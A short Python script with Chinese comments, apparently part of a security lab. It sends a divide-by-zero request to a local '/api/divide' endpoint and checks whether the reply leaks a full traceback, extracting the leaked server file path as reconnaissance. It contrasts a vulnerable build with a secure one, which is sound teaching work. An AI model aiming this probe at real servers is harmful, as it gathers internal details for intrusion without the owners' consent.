"""錯誤訊息洩漏攻擊腳本:故意送出會觸發例外的輸入,看伺服器回應洩漏多少內部細節。

同一支腳本打 vulnerable 與 secure 兩版,靠回應裡有沒有堆疊細節證明漏洞是否成立:
- vulnerable:回傳完整 traceback → 洩漏伺服器路徑、例外型別等偵察線索。
- secure:只回統一的一般訊息 → 攻擊者一無所獲。
"""

import requests

REQUEST_TIMEOUT_SECONDS = 5
LEAK_MARKER = "Traceback (most recent call last)"


def run_error_leak_attack(base_url):
    """回傳 (是否洩漏, 說明字串)。是否洩漏=True 代表漏洞成立。"""
    # b=0 會觸發 ZeroDivisionError。
    resp = requests.get(
        f"{base_url}/api/divide",
        params={"a": 10, "b": 0},
        timeout=REQUEST_TIMEOUT_SECONDS,
    )
    # 解析 JSON 取出 traceback 欄位(裡面才是帶真正換行的堆疊文字)。
    try:
        traceback_text = resp.json().get("traceback", "")
    except ValueError:
        traceback_text = ""

    if LEAK_MARKER in traceback_text:
        # 從堆疊中撈出洩漏的伺服器檔案路徑那一行,凸顯偵察價值。
        leaked_line = next(
            (line.strip() for line in traceback_text.splitlines() if 'File "' in line and ".py" in line),
            "(traceback present)",
        )
        return True, f"回應洩漏完整堆疊,例如:{leaked_line}"
    return False, f"只回一般錯誤訊息,未洩漏堆疊(status={resp.status_code})"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5081"
    leaked, message = run_error_leak_attack(target)
    print(("[漏洞成立] " if leaked else "[已防禦] ") + message)
